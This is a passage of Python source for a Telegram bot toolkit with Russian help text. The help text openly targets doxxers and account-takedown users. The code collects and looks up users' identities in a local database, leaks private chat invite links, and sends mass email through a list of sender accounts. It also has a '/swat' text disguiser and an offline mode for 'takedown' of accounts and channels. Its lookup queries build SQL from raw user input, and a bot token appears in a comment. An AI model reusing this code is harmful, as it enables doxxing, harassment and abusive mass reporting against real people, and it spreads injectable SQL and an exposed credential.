                    **11 - Уже в следующей обнове будет функция поиска данных по бд
  
                      Пока это все функции, что есть, но я планирую добавить несколько фич для сносиров/диванонеров
                      Возможны некоторые баги и поломки: 
  
                      1 - Ошибка при закрепе
                          Решение: удалить файл pin.txt
  
                      2 - Ошибка при поиске данных
                          Решение: иди нахуй
  
                      3 - Ошибка при использовании /link
                          Решение: Скорее всего бот не админ
  
                      4 - Ошибка при отправке любых соо
                          Решение: для тупых: удалить pin.txt и tt.txt. Для умных сигма боев: переписать айди 
                                   через /w (id чата)
  
                      5 - Остальные известные ошибки решаются в лс с ботом или когда кодер выкатит обнову """
  
                print(Colorate.Color(Colors.green, text, True))
                print(Colorate.Horizontal(Colors.red_to_purple, """
        
                             ██▓   ▓█████▄▄▄█████▓██▓   ██████        ▄████  ▒█████  
                            ▓██▒   ▓█   ▀▓  ██▒ ▓▒░█  ▒██    ▒     ▒ ██▒ ▀█▒▒██▒  ██▒
                            ▒██░   ▒███  ▒ ▓██░ ▒░ ▓  ░ ▓██▄       ░▒██░▄▄▄░▒██░  ██▒
                            ▒██░   ▒▓█  ▄░ ▓██▓ ░  ▒    ▒   ██▒    ░░▓█  ██▓▒██   ██░
                            ░██████░▒████  ▒██▒ ░  ░  ▒██████▒▒    ░▒▓███▀▒░░ ████▓▒░
                            ░ ▒░▓  ░░ ▒░   ▒ ░░    ░  ▒ ▒▓▒ ▒ ░     ░▒   ▒  ░ ▒░▒░▒░ 
                            ░ ░ ▒   ░ ░      ░        ░ ░▒  ░        ░   ░    ░ ▒ ▒░ 
                              ░ ░     ░    ░ ░        ░  ░  ░      ░ ░   ░ ░░ ░ ░ ▒  
                                ░     ░                     ░            ░      ░ ░  
        
        
        
                                """, 1))
                print()
                input('Press Enter to exit...')
                quit()

    def offstart():
        while True:
            if __name__ == "__main__":
               offline_mode(senders, receivers)
    

    def send_email(receiver, sender_email, sender_password, subject, body):
        for sender_email, sender_password in senders.items():
            try:
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver
                msg['Subject'] = subject
                msg.attach(MIMEText(body, 'plain'))
    
                server = smtplib.SMTP('smtp.rambler.ru', 587)
                server.starttls()
                server.login(sender_email, sender_password)
                server.sendmail(sender_email, receiver, msg.as_string())
                time.sleep(3)
                server.quit()
                return True
            except Exception as e:
                continue
        return False

    
    if func == '?':
        text = """                  ________________________________________________________________________________
                                                Краткое руководство
                  ________________________________________________________________________________
                                                      v0.25
  
                  QQ, это мой новый проект, сначала хотел сделать что-то одно, но получилась солянка ебаная.
                  WARNING: Данный софт управляет ботом в тг по токену бота, но не создает его(!)
                           Перед использованием надо создать бота самому (@BotFather)
                  *А схуяли софт просит мой айди?:
                          Софт запрашивает айди тг, тем самым ТЫ становишься его господином и повелителем
                                                  (не обязательно черным)
                  Так вот, в этом боте дохуища не взаимосвязанных функций, запоминай епт:
  
                      1 - Типичный парсер сообщений, для тех кто не шарит, это как анонка на максималках 
                          1.2 - /w (id чата) Команда для обозначения чата, куда будете писать через бота.
                                Это короче ну..  добавили бота в группу или ему в лс пишет какой-то
                                додик? Так вот там в сообщении есть  - id, его и копируешь
                          1.3 - /r (id сообщения) (сам текст) Команда для реплаев, выше уже описано,
                                как и где брать id сообщения, а сам текст я думаю сами придумаете
                          1.4 - /c (сам текст) Команда для отправки сообщений по id чата, тут все просто
  
                      2 - Когда- то понадобилось, решил сюда впихнуть - конвертер в сватерский текст
                          2.1 - /swat (текст для конверта) ну база же, че не понятно
  
                      3 - Есть возможность ставить реакции на сообщения через команду:
                          3.1 - /em (id сообщения) (сама реакция) Ставит реакцию
                          3.2 - /emd (id сообщения) Убирает реакцию
                          список доступных реакций можно узнать в самом боте, методом тыка)))00
  
                      4 - Чтобы не быть лохом и не попадать в неловкие ситуации
                          4.1 - /del (id сообщения) Удаляет отправленное тобой соо(как ты узнаешь id соо 
                          меня не ебет, используй мозг сука)
                          4.2 - /ed (id cообщения) (исправленный текст) Кста есть фича, редактированные
                                соо от бота не помечаются как отредаченные
  
                      5 - Изюминка, нет, целое поле винограда нахуй - функция поиска по бд. Бля я
                          не ебу как и под чем я его писал, но теперь данную функцию можно только удалить
                          нахуй и написать заново если кому делать нехуй, бд и ее формат внутри корневой
                          папки
                          5.1 - /inf (ник тг/юз/id) Работает как часики))))0)
  
                      6 - База всех баз - отправка и принятие медиа, гс, аудио, кружков, стиков, гифок.
                          просто отправляешь что-то из вышеперечисленного и оно само отправляется к адресату
  
                      7 - Возможность заебать челика
                          7.1 - /pin (id сообщения) Тупа закреп, хули
                          7.2 - /unpin (id сообщения) Тупа снять закреп
  
                      8 - Если каким-то чудом бот находится в админах чата или канала, то он может слить 
                          приват ссылку, работает в купе с командой 1.2 
                          8.1 - /link Без аргументов
  
                      9 - Для обиженок, работает в купе с командой 1.2
                          9.1 - /liv Ливнуть 

                     *10 - Добавлен глобальный оффлайн мод, в нем есть функции сноса акков и каналов

                    **11 - Уже в следующей обнове будет функция поиска данных по бд
  
                      Пока это все функции, что есть, но я планирую добавить несколько фич для сносиров/диванонеров
                      Возможны некоторые баги и поломки: 
  
                      1 - Ошибка при закрепе
                          Решение: удалить файл pin.txt
  
                      2 - Ошибка при поиске данных
                          Решение: иди нахуй
  
                      3 - Ошибка при использовании /link
                          Решение: Скорее всего бот не админ
  
                      4 - Ошибка при отправке любых соо
                          Решение: для тупых: удалить pin.txt и tt.txt. Для умных сигма боев: переписать айди 
                                   через /w (id чата)
  
                      5 - Остальные известные ошибки решаются в лс с ботом или когда кодер выкатит обнову"""
        print(Colorate.Color(Colors.green, text, True))
        print(Colorate.Horizontal(Colors.red_to_purple, """

                             ██▓   ▓█████▄▄▄█████▓██▓   ██████        ▄████  ▒█████  
                            ▓██▒   ▓█   ▀▓  ██▒ ▓▒░█  ▒██    ▒     ▒ ██▒ ▀█▒▒██▒  ██▒
                            ▒██░   ▒███  ▒ ▓██░ ▒░ ▓  ░ ▓██▄       ░▒██░▄▄▄░▒██░  ██▒
                            ▒██░   ▒▓█  ▄░ ▓██▓ ░  ▒    ▒   ██▒    ░░▓█  ██▓▒██   ██░
                            ░██████░▒████  ▒██▒ ░  ░  ▒██████▒▒    ░▒▓███▀▒░░ ████▓▒░
                            ░ ▒░▓  ░░ ▒░   ▒ ░░    ░  ▒ ▒▓▒ ▒ ░     ░▒   ▒  ░ ▒░▒░▒░ 
                            ░ ░ ▒   ░ ░      ░        ░ ░▒  ░        ░   ░    ░ ▒ ▒░ 
                              ░ ░     ░    ░ ░        ░  ░  ░      ░ ░   ░ ░░ ░ ░ ▒  
                                ░     ░                     ░            ░      ░ ░  



                        """, 1))
        print()
        input('Press Enter to main menu...')
        os.system('cls')
        
    elif func == '1':
        os.system('cls')
        offstart()



        
    elif func == '4':
        os.system('cls')
        banner()
        break
    else:
        print(Colorate.Horizontal(Colors.green_to_white, 'Uncorrect, try again', 1))
        input()
        os.system('cls')



print(Colorate.Horizontal(Colors.green_to_white, 'Alrigt, have fun', 1))
print()
time.sleep(1)
admin()
token()
os.system('cls')
in_work()
print()
print()
# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Подключение к базе данных
db = sqlite3.connect('verest.db', check_same_thread=False)
sql = db.cursor()

sql.execute("""CREATE TABLE IF NOT EXISTS users (
  id BIGINT UNIQUE,
  usersname TEXT,
  username TEXT,
  data timestamp DEFAULT CURRENT_TIMESTAMP
  );
""")

sql.execute("""CREATE TRIGGER IF NOT EXISTS update_date_on_update
AFTER UPDATE ON users
FOR EACH ROW
BEGIN
    UPDATE users
    SET data = CURRENT_TIMESTAMP
    WHERE rowid = NEW.rowid;
END;""")
db.commit()
db.close()

# Получение ID из файла
def read_id_chat():
    global ID
    try:
        with open('tt.txt', 'r') as tt:
            ID = tt.read().strip()
    except:
        with open('tt.txt', 'w') as tt:
            ID = tt.write('0')

read_id_chat()

def read_id_pin():
    global old_pin
    try:
        with open('pin.txt', 'r') as pp:
            old_pin = pp.read().strip()
    except:
        with open('pin.txt', 'w') as pp:
            old_pin = pp.write('0')

read_id_pin()
# Инициализация бота и диспетчера
#TOKEN = '7526061236:AAFR4VuxB-6ZICLa1NzOKZPlQ4z2xjZ_1JU'
#session = AiohttpSession(proxy='http://proxy.server:3128')
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
#storage = MemoryStorage()
dp = Dispatcher()

#idchnik = 7359911450  # ID ADMINA

@dp.message(Command('c'))
async def chatmsg(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            text = " ".join(message.text.split()[1:])
            await bot.send_chat_action(chat_id=ID, action='typing')
            time.sleep(3)
            await bot.send_message(ID, text)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки сообщения❌\n\nРазработчик уже знает об этой проблеме и решает ее⏱')

@dp.message(Command('pin'))
async def chatreply(message: Message) -> None:
    try:
        try:
            if message.from_user.id == idchnik and message.chat.id == idchnik:
                to_pin = message.text.split()[1]
                await bot.pin_chat_message(chat_id = idchnik, message_id = to_pin)
        except:
            if message.from_user.id == idchnik and message.chat.id == idchnik:
                to_pin = message.reply_to_message.message_id
                await bot.pin_chat_message(chat_id = idchnik, message_id = to_pin)
    except:
        await bot.send_message(idchnik, f'Ошибка закрепа❌\n\nСообщение не найдено')

@dp.message(Command('unpin'))
async def chatreply(message: Message) -> None:
    try:
        try:
            if message.from_user.id == idchnik and message.chat.id == idchnik:
                to_unpin = message.text.split()[1]
                await bot.unpin_chat_message(chat_id = idchnik, message_id = to_unpin)
        except:
            if message.from_user.id == idchnik and message.chat.id == idchnik:
                to_unpin = message.reply_to_message.message_id
                await bot.unpin_chat_message(chat_id = idchnik, message_id = to_unpin)
    except:
        await bot.send_message(idchnik, f'Ошибка закрепа❌\n\nСообщение не найдено')

@dp.message(Command('w'))
async def chatid(message: Message) -> None:
    global old_pin
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            global ID
            g = str(message.text.split()[1])
            with open('tt.txt', 'w') as tt:
                tt.write(g)
            ID = g
            photo = await bot.get_user_profile_photos(ID)
            pin = await bot.send_photo(chat_id=idchnik, photo=photo.photos[0][2].file_id, caption=f'✅ Текущий чат: {ID}\n\n<a href="tg://user?id={ID}">чат</a>', parse_mode='html')
            try:
                await bot.unpin_chat_message(chat_id=idchnik, message_id=old_pin)
                pin = pin.message_id
                await bot.pin_chat_message(chat_id=idchnik, message_id=pin)
                p = str(pin)
                with open('pin.txt', 'w') as pp:
                    pp.write(p)
                    pp.close()
                old_pin = p
            except:
                pin = pin.message_id
                await bot.pin_chat_message(chat_id=idchnik, message_id=pin)
                p = str(pin)
                with open('pin.txt', 'w') as pp:
                    pp.write(p)
                    pp.close()
                old_pin = p
    except:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            pin = await bot.send_message(idchnik, f'✅ Текущий чат: {ID}\n\n<a href="tg://user?id={ID}">чат</a>')
            try:
                await bot.unpin_chat_message(chat_id=idchnik, message_id=old_pin)
                pin = pin.message_id
                await bot.pin_chat_message(chat_id=idchnik, message_id=pin)
                p = str(pin)
                with open('pin.txt', 'w') as pp:
                    pp.write(p)
                old_pin = p
            except:
                pin = pin.message_id
                await bot.pin_chat_message(chat_id=idchnik, message_id=pin)
                p = str(pin)
                with open('pin.txt', 'w') as pp:
                    pp.write(p)
                old_pin = p
@dp.message(Command('r'))
async def chatreply(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            idr = message.text.split()[1]
            text = " ".join(message.text.split()[2:])
            await bot.send_chat_action(chat_id=ID, action='typing')
            time.sleep(3)
            await bot.send_message(ID, text, reply_to_message_id=idr)
    except:
        await bot.send_message(idchnik, f'Ошибка реплая❌\n\nСообщение не найдено')

@dp.message(Command('em'))
async def MessageReaction(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            idr = message.text.split()[1]
            emoji = " ".join(message.text.split()[2:])
            reaction = [{"type": "emoji", "emoji": emoji}] #ReactionTypeEmoji(emoji=emoji)
            await bot.set_message_reaction(ID, idr, reaction=reaction, is_big=True)
    except:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'Такую реакцию нельзя поставить❌\n\nCписок возможных реакций: "👍", "👎", "❤", "🔥", "🥰", "👏", "😁", "🤔", "🤯", "😱", "🤬", "😢", "🎉", "🤩", "🤮", "💩", "🙏", "👌", "🕊", "🤡", "🥱", "🥴", "😍", "🐳", "❤‍🔥", "🌚", "🌭", "💯", "🤣", "⚡", "🍌", "🏆", "💔", "🤨", "😐", "🍓", "🍾", "💋", "🖕", "😈", "😴", "😭", "🤓", "👻", "👨‍💻", "👀", "🎃", "🙈", "😇", "😨", "🤝", "✍", "🤗", "🫡", "🎅", "🎄", "☃", "💅", "🤪", "🗿", "🆒", "💘", "🙉", "🦄", "😘", "💊", "🙊", "😎", "👾", "🤷‍♂", "🤷", "🤷‍♀", "😡"')



#удаление реакции
@dp.message(Command('emd'))
async def MessageReactionDelete(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            idr = message.text.split()[1]
            await bot.set_message_reaction(ID, idr, reaction=None)
    except:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'Ошибка удаления реакции😢\n\nCообщение не найдено')

@dp.message(Command('link'))
async def link(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            link = await bot.export_chat_invite_link(chat_id=ID)
            await bot.send_message(idchnik, link)
    except:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'Ошибка создания ссылки😢\n\nСкорее всего у бота нет админки')

@dp.message(Command('liv'))
async def leaveChat(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.leave_chat(chat_id=ID)
    except:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'хфыхфых афк/офф бан😚\n\nОшибка выхода с чата')

@dp.message(F.content_type == ContentType.VIDEO)
async def chatvideo(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            caption = message.caption
            video = message.video.file_id
            await bot.send_chat_action(chat_id=ID, action='record_video')
            time.sleep(10)
            await bot.send_chat_action(chat_id=ID, action='upload_video')
            time.sleep(10)
            await bot.send_video(chat_id=ID, video=video, caption=caption)
        else:
            caption = message.caption
            idr = message.message_id
            video = message.video.file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_video(chat_id=idchnik, video=video, caption=caption)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки видео❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.VIDEO_NOTE)
async def chatvideonote(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            video_note = message.video_note.file_id
            await bot.send_chat_action(chat_id=ID, action='record_video_note')
            time.sleep(10)
            await bot.send_chat_action(chat_id=ID, action='upload_video_note')
            time.sleep(10)
            await bot.send_video_note(chat_id=ID, video_note=video_note)
        else:
            idr = message.message_id
            video_note = message.video_note.file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_video_note(chat_id=idchnik, video_note=video_note)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки кружка❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.VOICE)
async def chatvoice(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            voice = message.voice.file_id
            await bot.send_chat_action(chat_id=ID, action='record_voice')
            time.sleep(10)
            await bot.send_chat_action(chat_id=ID, action='upload_voice')
            time.sleep(10)
            await bot.send_voice(chat_id=ID, voice=voice)
        else:
            idr = message.message_id
            voice = message.voice.file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_voice(chat_id=idchnik, voice=voice)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки голосового сообщения❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.STICKER)
async def chatsticker(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            stick = message.sticker.file_id
            await bot.send_chat_action(chat_id=ID, action='choose_sticker')
            time.sleep(5)
            await bot.send_sticker(chat_id=ID, sticker=stick)
        else:
            if message.chat.id != -1001681447534:
                idr = message.message_id
                stick = message.sticker.file_id
                await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
                await bot.send_sticker(chat_id=idchnik, sticker=stick)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки стикера❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.PHOTO)
async def chatphoto(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            caption = message.caption
            img = message.photo[-1].file_id
            await bot.send_chat_action(chat_id=ID, action='upload_photo')
            time.sleep(10)
            await bot.send_photo(chat_id=ID, photo=img, caption=caption)
        else:
            caption = message.caption
            idr = message.message_id
            img = message.photo[-1].file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_photo(chat_id=idchnik, photo=img, caption=caption)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки фото❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.ANIMATION)
async def chatgif(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            gif = message.animation.file_id
            await bot.send_animation(chat_id=ID, animation=gif)
        else:
            idr = message.message_id
            gif = message.animation.file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_animation(chat_id=idchnik, animation=gif)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки гиф❌\n\nУже решается⏱')

@dp.message(F.content_type == ContentType.AUDIO)
async def chataudio(message: types.Message):
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            caption = message.caption
            audio = message.audio.file_id
            await bot.send_chat_action(chat_id=ID, action='upload_audio', caption=caption)
            time.sleep(10)
            await bot.send_audio(chat_id=ID, audio=audio)
        else:
            idr = message.message_id
            audio = message.audio.file_id
            await bot.send_message(idchnik, f'{message.chat.title}: <code>{idr}</code>: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>:', parse_mode='html')
            await bot.send_audio(chat_id=idchnik, audio=audio)
    except:
        await bot.send_message(idchnik, f'Ошибка отправки аудио❌\n\nУже решается⏱')

@dp.message(Command('inf'))
async def inf(message):
    global datas
    global use
    db = sqlite3.connect('verest.db', check_same_thread=False)
    sql = db.cursor()
    user_id = message.from_user.id
    usersname = message.from_user.full_name
    now = datetime.datetime.now(datetime.UTC)
    data = now.strftime("%Y-%m-%d %H:%M:%S")
    if message.from_user.username == None:
        username = "dont use"
    else:
        username = message.from_user.username
    query = "SELECT COUNT(*) FROM users WHERE id = ?"
    sql.execute(query, (user_id,))
    count = sql.fetchone()[0]
    if count > 0:
        #print("Пользователь существует.")
        sql.execute("UPDATE users SET usersname = ?, username = ? WHERE id = ?", (usersname, username, user_id))
        db.commit()
        db.close()
    else:
        #print("Пользователь не найден.")
        sql.execute("INSERT INTO users (id, usersname, username) VALUES (?, ?, ?)", (user_id, usersname, username))
        db.commit()
        db.close()
    try:
        try:
            try:
                db = sqlite3.connect('verest.db', check_same_thread=False)
                sql = db.cursor()
                user_id = message.text.split()[1]

                usernam = sql.execute(f'SELECT username FROM users WHERE id = {user_id}').fetchone()
                username = ''.join(usernam)

                usersnam = sql.execute(f'SELECT usersname FROM users WHERE id = {user_id}').fetchone()
                usersname = ''.join(usersnam)

                date = str(sql.execute(f'SELECT data FROM users WHERE id = {user_id}').fetchone())
                data = ''.join(date)

                await bot.send_message(idchnik, text=f'Поиск по id Telegram {user_id}...')

                time.sleep(2)

                await bot.send_message(idchnik, text=f'Аккаунт найден✅')
                await bot.send_message(idchnik, text=f'Фото не обнаружено\n\n👤\n├id: <code>{user_id}</code>\n├user"$ name: <code>{usersname}</code>\n├history change username: <code>{username}</code>\n└link: <a href="tg://user?id={user_id}">{usersname}</a>\n\n⏱\nИнформация от {date}', parse_mode='html')
            except:
                db = sqlite3.connect('verest.db', check_same_thread=False)
                sql = db.cursor()
                usernam = message.text.split()[1]

                usid = sql.execute(f"SELECT id FROM users WHERE username LIKE '%{usernam}%'").fetchall()
                for row in usid:
                    user_id = row[0]

                usersnam = sql.execute(f"SELECT usersname FROM users WHERE username LIKE '%{usernam}%'").fetchone()
                usersname = ''.join(usersnam)

                userna = sql.execute(f"SELECT username FROM users WHERE username LIKE '%{usernam}%'").fetchone()
                username = ''.join(userna)

                date = str(sql.execute(f"SELECT data FROM users WHERE username LIKE '%{usernam}%'").fetchone())
                data = ''.join(date)

                await bot.send_message(idchnik, text=f'Поиск по username Telegram {usernam}...')

                time.sleep(2)

                await bot.send_message(idchnik, text=f'Аккаунт найден✅')
                await bot.send_message(idchnik, text=f'Фото не обнаружено\n\n👤\n├id: <code>{user_id}</code>\n├user"$ name: <code>{usersname}</code>\n├history change username: <code>{username}</code>\n└link: <a href="tg://user?id={user_id}">{usersname}</a>\n\n⏱\nИнформация от {date}', parse_mode='html')
        except:
            db = sqlite3.connect('verest.db', check_same_thread=False)
            sql = db.cursor()
            usersna = message.text.split()[1]

            usid = sql.execute(f"SELECT id FROM users WHERE usersname LIKE '%{usersna}%'").fetchall()
            for row in usid:
                user_id = row[0]

            usernam = sql.execute(f"SELECT username FROM users WHERE usersname LIKE '%{usersna}%'").fetchone()
            username = ''.join(usernam)

            usersnam = sql.execute(f"SELECT usersname FROM users WHERE usersname LIKE '%{usersna}%'").fetchone()
            usersname = ''.join(usersnam)

            date = str(sql.execute(f"SELECT data FROM users WHERE usersname LIKE '%{usersna}%'").fetchone())
            data = ''.join(date)

            await bot.send_message(idchnik, text=f'Поиск по users name Telegram {usersna}...')

            time.sleep(2)

            await bot.send_message(idchnik, text=f'Аккаунт найден✅')
            await bot.send_message(idchnik, text=f'Фото не обнаружено\n\n👤\n├id: <code>{user_id}</code>\n├user"$ name: <code>{usersname}</code>\n├history change username: <code>{username}</code>\n└link: <a href="tg://user?id={user_id}">{usersname}</a>\n\n⏱\nИнформация от {date}', parse_mode='html')
    except:
        await bot.send_message(idchnik, text='Пользователь не найден в базе❌')
        await bot.send_message(idchnik, text='Пробую другие методы...')
        if message.reply_to_message:
            db = sqlite3.connect('verest.db', check_same_thread=False)
            sql = db.cursor()
            user_id = message.reply_to_message.from_user.id
            usersname = message.reply_to_message.from_user.full_name
            now = datetime.datetime.now(datetime.UTC)
            data = now.strftime("%Y-%m-%d %H:%M:%S")
            if message.reply_to_message.from_user.username == None:
                username = "dont use"
            else:
                username = message.reply_to_message.from_user.username
            query = "SELECT COUNT(*) FROM users WHERE id = ?"
            sql.execute(query, (user_id,))
            count = sql.fetchone()[0]
            if count > 0:
                #print("Пользователь существует.")
                sql.execute("UPDATE users SET usersname = ?, username = ? WHERE id = ?", (usersname, username, user_id))
                db.commit()
                db.close()
            else:
                #print("Пользователь не найден.")
                sql.execute("INSERT INTO users (id, usersname, username) VALUES (?, ?, ?)", (user_id, usersname, username))
                db.commit()
                db.close()
            if message.reply_to_message.from_user.username == None:
                use = "don't use"
            else:
                use = f"@{message.reply_to_message.from_user.username}"
            try:
                now = datetime.datetime.utcnow()
                data = now.strftime("%Y-%m-%d %H:%M:%S")
                photo = await bot.get_user_profile_photos(message.reply_to_message.from_user.id)
                await bot.send_photo(chat_id=idchnik, photo=photo.photos[0][2].file_id, caption=f'''👤
├chat id: <code>{message.reply_to_message.chat.id}</code>
├message id: <code>{message.reply_to_message.message_id}</code>
├user id: <code>{message.reply_to_message.from_user.id}</code>
├user"$ name: <code>{message.reply_to_message.from_user.first_name}</code>
├username: {use}
└link: <a href="tg://user?id={message.reply_to_message.from_user.id}">{message.reply_to_message.from_user.full_name}</a>

⏱
Информация от {data}''', parse_mode='html')
                #print(message)
                print()
            except:
                now = datetime.datetime.now(datetime.UTC)
                data = now.strftime("%Y-%m-%d %H:%M:%S")
                await bot.send_message(chat_id=idchnik, text=f'''👤
├chat id: <code>{message.reply_to_message.chat.id}</code>
├message id: <code>{message.reply_to_message.message_id}</code>
├user id: <code>{message.reply_to_message.from_user.id}</code>
├user"$ name: <code>{message.reply_to_message.from_user.first_name}</code>
├username: {use}
└link: <a href="tg://user?id={message.reply_to_message.from_user.id}">{message.reply_to_message.from_user.full_name}</a>

⏱
Информация от {data}''', parse_mode='html')
                #print(message)
                print()
        else:
            db = sqlite3.connect('verest.db', check_same_thread=False)
            sql = db.cursor()
            user_id = message.from_user.id
            usersname = message.from_user.full_name
            now = datetime.datetime.now(datetime.UTC)
            data = now.strftime("%Y-%m-%d %H:%M:%S")
            if message.from_user.username == None:
                username = "dont use"
            else:
                username = message.from_user.username
            query = "SELECT COUNT(*) FROM users WHERE id = ?"
            sql.execute(query, (user_id,))
            count = sql.fetchone()[0]
            if count > 0:
                #print("Пользователь существует.")
                sql.execute("UPDATE users SET usersname = ?, username = ? WHERE id = ?", (usersname, username, user_id))
                db.commit()
                db.close()
            else:
                #print("Пользователь не найден.")
                sql.execute("INSERT INTO users (id, usersname, username) VALUES (?, ?, ?)", (user_id, usersname, username))
                db.commit()
                db.close()
            if message.from_user.username == None:
                use = "don't use"
            else:
                use = f"@{message.from_user.username}"
            try:
                now = datetime.datetime.now(datetime.UTC)
                data = now.strftime("%Y-%m-%d %H:%M:%S")
                photo = await bot.get_user_profile_photos(message.from_user.id)
                await bot.send_photo(chat_id=idchnik, photo=photo.photos[0][2].file_id, caption=f'''👤
├chat id: <code>{message.chat.id}</code>
├message id: <code>{message.message_id}</code>
├user id: <code>{message.from_user.id}</code>
├user"$ name: <code>{message.from_user.first_name}</code>
├username: {use}
└link: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>

⏱
Информация от {data}''', parse_mode='html')
                #print(message)
                print()
            except:
                now = datetime.datetime.now(datetime.UTC)
                data = now.strftime("%Y-%m-%d %H:%M:%S")
                await bot.send_message(chat_id=idchnik, text=f'''👤
├chat id: <code>{message.chat.id}</code>
├message id: <code>{message.message_id}</code>
├user id: <code>{message.from_user.id}</code>
├user"$ name: <code>{message.from_user.first_name}</code>
├username: {use}
└link: <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>

⏱
Информация от {data}''', parse_mode='html')
                #print(message)
                print()

@dp.message(Command('del'))
async def delete(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            idr = message.text.split()[1]
            await bot.delete_message(chat_id=ID, message_id=idr)
    except:
        ex = Exception
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'Ошибка удаления сообщения❌\n\nСообщение не найдено')

@dp.message(Command('ed'))
async def edit(message: Message) -> None:
    try:
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            text = " ".join(message.text.split()[2:])
            idr = message.text.split()[1]
            await bot.edit_message_text(chat_id=ID, message_id=idr, text=text)
    except:
        ex = Exception
        if message.from_user.id == idchnik and message.chat.id == idchnik:
            await bot.send_message(idchnik, f'Ошибка редактирования сообщения❌\n\nСообщение не найдено')

@dp.message(Command('swat'))
async def swat(message: Message) -> None:
    if message.chat.id == message.from_user.id:
        data = str(message.text.split()[1:])
        data = data.upper()
        char_list = list(data)
        code_list = {
            "А": "а", "Б": "6", "В": "V", "Д": "9", "Е": "3", "Г": "7",
            "Ё": "Ё", "Ж": "j", "З": "Z", "И": "U", "К": "K", "Л": "Л",
            "М": "M", "Н": "n", "О": "0", "П": "П", "Р": "p", "С": "S",
            "Т": "Т", "У": "Y", "Ф": "8", "Х": "Х", "Ц": "Ц", "Ч": "4",
            "Ш": "W", "Щ": "щ", "Й": "Й", "Я": "Я", "Ъ": "Ъ", "Ь": "ь",
            "Э": "3", "Ю": "Ю", "Ы": "1", ".": ".", " ": " ", "'": "",
            ",": "", "!": "!", ":": ":", ";": ";", "?": "?", "-": "-",
            "/": "/", "|": "|", "{": "{", "}": "}", "[": "", "]": "",
            "(": "(", ")": ")", "*": "*", "^": "^", "$": "$", "#": "#",
            "@": "@", "`": "`", "&": "&", "%": "%", ">": ">", "1": "1",
            "2": "2", "3": "3", "7": "7", "8": "8", "9": "9", "0": "0",
            "C": "C", "D": "D", "E": "E", "F": "F", "I": "i", "J": "J",
            "K": "k", "L": "L", "O": "o", "P": "P", "Q": "Q", "R": "r",
            "U": "u", "V": "v", "W": "w", "X": "x", "+": "+", "_": "_",
            "№": "№", "~": "~", "<": "<", "5": "5", "4": "4", "6": "6",
            "A": "a", "B": "b", "G": "G", "H": "H", "M": "m", "N": "n",
            "S": "S", "T": "T", "Y": "y", "Z": "Z", '"': '"'
        }

        shifr = ''.join([code_list[i] for i in char_list])
        await bot.send_message(chat_id=message.from_user.id, text=f'<code>{shifr}</code>', parse_mode='html')

@dp.message()
async def slivy(message: Message) -> None:
    global use

    if message.forward_from:
        try:
            db = sqlite3.connect('verest.db', check_same_thread=False)
            sql = db.cursor()
            user_id = message.forward_from.id
            usersname = message.forward_from.full_name
            if message.forward_from.username is None:
                username = "dont use"
            else:
                username = message.forward_from.username
            query = "SELECT COUNT(*) FROM users WHERE id = ?"
